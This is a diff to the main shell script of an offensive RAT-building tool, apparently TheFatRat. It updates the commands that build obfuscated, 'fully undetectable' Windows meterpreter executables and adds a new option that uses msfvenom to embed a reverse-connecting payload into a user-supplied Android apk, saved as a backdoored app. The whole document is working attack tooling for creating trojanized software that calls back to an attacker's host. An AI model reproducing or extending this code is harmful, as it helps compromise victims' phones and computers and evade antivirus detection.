@@ -86,13 +86,6 @@ if [[ -f "${path}/release" ]]; then
    exit 1
 fi
 
-# Create new target directory in main user root for fatrat generated files
-output="${HOME}/Fatrat_Generated"
-
-if [[ ! -d "${output}" ]]; then
-	mkdir "${output}" >/dev/null 2>&1
-fi
-
 # Create Safe Measures For Old Versions
 lstdir="${path}/output"
 aplst="$path/backdoored"
@@ -115,6 +108,27 @@ fi
 	read -rsp $'Press [ENTER] key to Continue\n' -n 1 key
 ./setup.sh
   exit 0
+fi
+file="config/config.path"
+#Check If Tools Path Config File Exists Before Proceeding
+#Config File Exists, Then Load Tools Paths To Specific Variables
+if [ -f "${file}" ]; then
+	msfconsole=$(sed -n 13p ${file})
+	msfvenom=$(sed -n 14p ${file})
+	backdoor=$(sed -n 15p ${file})
+	searchsploit=$(sed -n 16p ${file})
+	aapt=$(sed -n 10p ${file})
+	apktool=$(sed -n 11p ${file})
+	keytool=$(sed -n 7p ${file})
+	sign=$(sed -n 5p ${file})
+	dx=$(sed -n 9p ${file})
+	baksmali=$(sed -n 12p ${file})
+	output=$(sed -n 17p ${file})
+else
+
+#Config File Does Not Exist
+	echo -e $red"Configuration file does not exists, run setup.sh first for config ."
+   exit 1
 fi
 
 # VARIABLE GLOBAL
@@ -143,7 +157,6 @@ stag='temp/stag.c'
 apkconfig="${path}/config/apk.tmp"
 unzip=unzip
 temp="${path}/temp"
-file="config/config.path"
 grab="config/grab.conf"
 meterp="${path}/temp/meterpreter.rc"
 outf="app_backdoor.apk"
@@ -1141,26 +1154,6 @@ done
 clear
 
 
-#Check If Tools Path Config File Exists Before Proceeding
-#Config File Exists, Then Load Tools Paths To Specific Variables
-if [ -f "${file}" ]; then
-	msfconsole=$(sed -n 13p ${file})
-	msfvenom=$(sed -n 14p ${file})
-	backdoor=$(sed -n 15p ${file})
-	searchsploit=$(sed -n 16p ${file})
-	aapt=$(sed -n 10p ${file})
-	apktool=$(sed -n 11p ${file})
-	keytool=$(sed -n 7p ${file})
-	sign=$(sed -n 5p ${file})
-	dx=$(sed -n 9p ${file})
-	baksmali=$(sed -n 12p ${file})
-else
-
-#Config File Does Not Exist
-	echo -e $red"Configuration file does not exists, run setup.sh first for config ."
-   exit 1
-fi
-
 #If default Lhost & Lport configuration file exists then load their values to variables
 if [ -f "${defcon}" ]; then
 	yourip=$(sed -n 1p ${defcon})
@@ -1429,6 +1422,8 @@ else
 	   sleep 0.5
    exit 1
 fi
+sleep 1
+echo -e $okegreen [✔]::[Outputdir]: $output;
 sleep 1
 
 #WARNING !!!
@@ -1871,7 +1866,7 @@ if [ -z $fname ]; then
     	echo
     	echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
     	sleep 4
-    	python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    	python3 $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
    	 #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
     	met="32"
     	pstagef
@@ -1894,7 +1889,7 @@ if [ ! -f $icfold/$fname ]; then
     echo
     echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
     sleep 4
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    python3 $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
     met="32"
     pstagef
@@ -1912,7 +1907,7 @@ else
     fstager=$path/$fira
     echo
     echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
-	python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+	python3 $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
 	met="32"
     pstagef
 fi
@@ -1952,7 +1947,7 @@ if [ -z $fname ]; then
     	echo -e $yellow "  Your Port     :$okegreen $yourport"
     	echo -e $yellow "  Rat Filename  :$okegreen $fira"
     	fstager=$path/$fira
-    	python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    	python3 $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     	#Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     	met="64"
     	pstagef
@@ -1971,7 +1966,7 @@ if [ ! -f $icfold/$fname ]; then
     echo -e $yellow "  Your Port     :$okegreen $yourport"
     echo -e $yellow "  Rat Filename  :$okegreen $fira"
     fstager=$path/$fira
-    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    python3 $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     met="64"
     pstagef
@@ -1988,7 +1983,7 @@ else
     echo -e $yellow "  Icon filename :$okegreen $fname"
     fstager=$path/$fira
     echo ""
- 	 python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+ 	 python3 $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
     #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     met="64"
     pstagef
@@ -4147,7 +4142,34 @@ microsploit
 ;;
 esac
 }
-
+function tstapk() {
+rm -rf "$path/temp/tstapk" >/dev/null 2>&1
+rm -rf "$path/temp/tstapk.apk" >/dev/null 2>&1
+$apktool d "$path/temp/app.apk" -o "$path/temp/tstapk" >/dev/null 2>&1
+if [[ ! -d "$path/temp/tstapk" ]]
+then
+echo -e "$red""Error"
+echo -e "$red""Apktool in unable to decompile this apk"
+echo ""
+read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key	
+clear
+menu
+fi
+$apktool b "$path/temp/tstapk" -o "$path/temp/tstapk.apk" >/dev/null 2>&1	
+if [[ ! -f "$path/temp/tstapk.apk" ]]
+then
+echo -e "$red""Error"
+echo -e "$red""Apktool in unable to recompile this apk"
+echo -e "$okegreen"""
+read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key	
+clear
+menu
+fi
+echo -e "$okegreen""Done"
+echo ""	
+rm -rf "$path/temp/tstapk" >/dev/null 2>&1
+rm -rf "$path/temp/tstapk.apk" >/dev/null 2>&1
+}
 #EMBEDBACKDOORAPK
 function embedapk() {
 resize -s 45 86 > /dev/null
@@ -4211,6 +4233,8 @@ menu
   fi
 
 echo ""
+echo -ne "$okegreen""Testing your apk before next step ..."
+tstapk
 #go to payload android menu
 pldand
 echo ""
@@ -4219,10 +4243,11 @@ spinlong
 echo ""
 sleep 1
 #select tool to build apk rat
-echo -e $orange "+------------------------------+"
-echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.4a$orange |"
-echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange  |"
-echo -e $orange "+------------------------------+"
+echo -e $orange "+-------------------------------------+"
+echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.4a$orange       |"
+echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange         |"
+echo -e $orange "|$white [$okegreen 3$white ]$yellow Use MsfVenom Embedded method$orange  |"
+echo -e $orange "+-------------------------------------+"
 echo ""
 echo -ne $cyan "Select Tool to create apk : ";tput sgr0
 read apkto
@@ -4373,6 +4398,56 @@ echo "[*] Removing temporary files"
 sleep 2
 rm -rf $path/temp/* >/dev/null 2>&1
 echo "[✔] Done!"
+echo ""
+crlst
+;;
+3)
+echo ""
+echo "---------Backdooring your apk with MSFVenom-----------"
+echo ""
+$msfvenom -x $apkt -p $payload LHOST=$yourip LPORT=$yourport -o temp/backand.apk
+echo ""
+echo "-----------------------Finished-----------------------"
+echo ""
+if [[ ! -f "temp/backand.apk" ]]
+then
+echo "MSFVenom was unable to embed a payload on your apk"
+echo ""
+echo -n "Press ENTER key to return to menu"
+read rsp
+rm -rf temp/* > /dev/null 2>&1
+clear && menu
+fi
+
+ren=`shuf -i 1-1000 -n 1`
+back=$output/app_backdoored.apk
+if [ -f "$back" ]
+then
+mv $output/app_backdoored.apk $output/app_backdoored_$ren.apk >>$log 2>&1
+echo -e $yellow ""
+echo "[!] FatRat Detected that you already had a previous created backdoor
+file in ($output/) with the name app_backdoored.apk ."
+echo -e $okegreen ""
+echo "[✔] FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
+
+# Moving apk backdoor to final destination
+mv $path/temp/backand.apk $output/app_backdoored.apk >>$log 2>&1
+
+# Removing temp files
+rm -rf temp/* > /dev/null 2>&1
+crlst
+else
+
+
+# Moving apk backdoor to final destination
+mv $path/temp/backand.apk $output/app_backdoored.apk >>$log 2>&1
+rm -rf temp/* > /dev/null 2>&1
+echo ""
+echo "Your backdoored apk can be found in : $output/app_backdoored.apk"
+echo ""
+crlst
+fi
+echo "Your backdoored apk can be found in : $output/app_backdoored.apk"
 echo ""
 crlst
 ;;
